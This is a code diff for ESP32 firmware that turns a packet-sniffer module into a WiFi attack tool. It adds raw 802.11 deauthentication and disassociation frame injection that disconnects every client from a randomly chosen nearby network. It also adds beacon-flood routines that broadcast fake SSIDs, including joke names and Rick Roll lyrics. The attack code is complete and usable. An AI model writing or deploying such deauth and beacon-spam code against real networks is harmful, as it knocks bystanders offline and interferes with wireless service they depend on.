@@ -1,6 +1,15 @@
+/**
+ * ╔═══════════════════════════════════════════════════════════════╗
+ * ║                  PACKET SNIFFER SYSTEM                        ║
+ * ║   Handles WiFi promiscuous mode, beacons, and deauths         ║
+ * ║                                                               ║
+ * ║                     by Alex R.                                ║
+ * ╚═══════════════════════════════════════════════════════════════╝
+ */
 #include "PacketSniffer.h"
 
 extern "C" {
+  // Low-level ESP32 WiFi function for raw packet transmission
   esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_seq_net);
 }
 
@@ -22,7 +31,11 @@ PacketSniffer::PacketSniffer() {
     probeCount = 0;
     networkCount = 0;
     probeCount_arr = 0;
+    probeCount_arr = 0;
     pendingEvent = EVT_NONE;
+    attackMode = false;
+    attackStart = 0;
+    attackType = 0;
 }
 
 void PacketSniffer::setTechLevel(int level) {
@@ -30,43 +43,61 @@ void PacketSniffer::setTechLevel(int level) {
 }
 
 void PacketSniffer::sendDeauth(uint8_t* bssid, uint8_t* client) {
-    // 802.11 Deauth frame
-    // 26 bytes header + 2 bytes reason
+    // 802.11 Deauth/Disassoc frame (24 byte header + 2 byte reason)
     uint8_t packet[26];
+    memset(packet, 0, 26);
 
-    // Frame Control: Management (00), Deauth (1100) -> 0xC0
-    packet[0] = 0xC0;
-    packet[1] = 0x00;
-
-    // Duration
-    packet[2] = 0x3A;
-    packet[3] = 0x01;
-
-    // DA (Destination - Client or Broadcast)
+    // Common header for management frames
+    // Duration will be 0x0000
+    // Sequence number will be 0x0000 (ESP will overwrite if sequence control is enabled)
+    
+    // Address 1: Destination (Target client)
     memcpy(&packet[4], client, 6);
-
-    // SA (Source - AP BSSID)
+    // Address 2: Source (Access point / BSSID)
     memcpy(&packet[10], bssid, 6);
-
-    // BSSID
+    // Address 3: BSSID
     memcpy(&packet[16], bssid, 6);
 
-    // Seq Control
-    packet[22] = 0xF0;
-    packet[23] = 0xFF;
+    // Reason codes to rotate: 
+    // 1: Unspecified
+    // 4: Inactivity 
+    // 8: Station leaving
+    static uint16_t reasonCodes[] = { 1, 4, 8 };
+    static int rcIdx = 0;
+    uint16_t reason = reasonCodes[rcIdx];
+    rcIdx = (rcIdx + 1) % 3;
+    packet[24] = reason & 0xFF;
+    packet[25] = (reason >> 8) & 0xFF;
 
-    // Reason code (7 = Class 3 frame received from nonassociated STA)
-    packet[24] = 0x07;
-    packet[25] = 0x00;
-
-    // Send packet
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
-
-    // Repeat a few times for effectiveness
+    // Send multiple times on current channel
     for(int i=0; i<3; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
-        delay(5);
+        // Deauth
+        packet[0] = 0xC0; // Subtype 1100 (Deauth)
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
+        
+        // Disassoc
+        packet[0] = 0xA0; // Subtype 1010 (Disassoc)
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
+        
+        delay(1);
     }
+}
+
+void PacketSniffer::deauthAttack() {
+    if (networkCount == 0) return;
+    attackMode = true;
+    
+    // Target a random known network for disruption
+    int target = random(0, networkCount);
+    uint8_t broadcast[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+    
+    Serial.printf("[WIFI] Deauthing: %s\n", networks[target].ssid);
+    
+    // Switch to target channel
+    esp_wifi_set_channel(networks[target].channel, WIFI_SECOND_CHAN_NONE);
+    
+    // Send to broadcast address (kick everyone)
+    sendDeauth(networks[target].bssid, broadcast);
 }
 
 void PacketSniffer::init(SDManager *sd) {
@@ -97,10 +128,99 @@ void PacketSniffer::stop() {
     Serial.println("[Sniffer] Stopped");
 }
 
+// === BEACON ATTACKS ===
+
+void PacketSniffer::stopAttack() {
+    attackMode = false;
+    attackType = 0;
+}
+
+void PacketSniffer::beaconSpam() {
+    attackMode = true;
+    attackType = 1; // Random/Common SSIDs
+    attackStart = millis();
+}
+
+void PacketSniffer::rickRoll() {
+    attackMode = true;
+    attackType = 2; // Lyrics
+    attackStart = millis();
+}
+
+// Raw Beacon Frame 
+void PacketSniffer::broadcastBeacon(const char* ssid) {
+    uint8_t epoch = 0;
+    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
+                /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+                /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+                /*22*/  0xc0, 0x6c, 
+                /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
+                /*32*/  0x64, 0x00, // Intervals
+                /*34*/  0x01, 0x04, // Capabilities
+                /*36*/  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72 // Dummy SSID
+                };
+
+    int ssidLen = strlen(ssid);
+    if (ssidLen > 32) ssidLen = 32;
+
+    packet[37] = ssidLen;
+    memcpy(&packet[38], ssid, ssidLen);
+
+    // Channel (Tag 3)
+    packet[38 + ssidLen] = 0x03;
+    packet[39 + ssidLen] = 0x01;
+    packet[40 + ssidLen] = currentChannel;
+
+    // Send
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, 41 + ssidLen, false);
+}
+
 void PacketSniffer::loop() {
     if (!isRunning) return;
     
     unsigned long now = millis();
+
+    // ATTACK LOOP
+    if (attackMode) {
+        // Auto-stop
+        if (now - attackStart > 15000) {
+            stopAttack();
+        } else {
+            // Rapid fire beacons
+            if (attackType == 1) { // Random / Funny SSIDs
+                 // Channel Hop (for visibility)
+                 currentChannel = random(1, 14);
+                 esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+                 
+                 const char* names[] = {
+                     "FREE WIFI", "Loading...", "Virus.exe", "FBI Van 4", 
+                     "Skynet", "Connect for Beer", "Tell My WiFi Love Her", 
+                     "Drop It Like Its Hotspot", "No Internet", "Yell Penis for PW"
+                 };
+                 broadcastBeacon(names[random(0, 10)]);
+                 delay(10); // Throttle slightly
+            } 
+            else if (attackType == 2) { // Rick Roll
+                const char* lyrics[] = {
+                    "01_Never_Gonna", "02_Give_You_Up", "03_Never_Gonna", 
+                    "04_Let_You_Down", "05_Never_Gonna", "06_Run_Around", 
+                    "07_And_Desert_You"
+                };
+                
+                // Set disparate channel for burst
+                currentChannel = random(1, 14);
+                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+                
+                // Broadcast all lines rapidly
+                for (int i=0; i<7; i++) {
+                    broadcastBeacon(lyrics[i]);
+                    delay(5);
+                }
+            }
+        }
+        return; // Skip sniffing while attacking
+    }
 
     // Channel hopping (Unlocked at Level 4)
     if (techLevel >= 4) {
